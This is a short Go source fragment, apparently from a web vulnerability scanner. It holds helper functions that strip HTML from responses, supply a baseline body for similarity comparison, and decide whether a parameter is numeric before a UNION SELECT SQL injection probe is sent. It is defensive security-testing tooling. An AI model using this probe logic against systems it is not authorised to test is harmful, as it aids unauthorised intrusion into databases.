func readableText(region string) string {
	return html.UnescapeString(htmlTagPattern.ReplaceAllString(region, ""))
}

// baselineBody returns the baseline body, or "" when there is no baseline.
//
// An empty string makes the similarity comparison read as "unrelated", which
// fails the `baseVsTrue >= 0.94` test. That is the safe direction: with no
// baseline the detector proves nothing rather than guessing.
func baselineBody(baseline *Response) string {
	if baseline == nil {
		return ""
	}
	return baseline.Body
}

// numericBaseline reports whether the surface's current value is a number.
//
// A UNION probe is only meaningful where the application already treats the
// parameter as numeric. Firing `UNION SELECT` at a date or an email field
// produces a syntax error rather than a result, and the noise costs the target
// more than the finding is worth.
func numericBaseline(p Point) bool {
	value := strings.TrimSpace(p.Values.Get(p.Param))
	if value == "" {
		return false
	}
	_, err := strconv.ParseInt(value, 10, 64)
	return err == nil
}
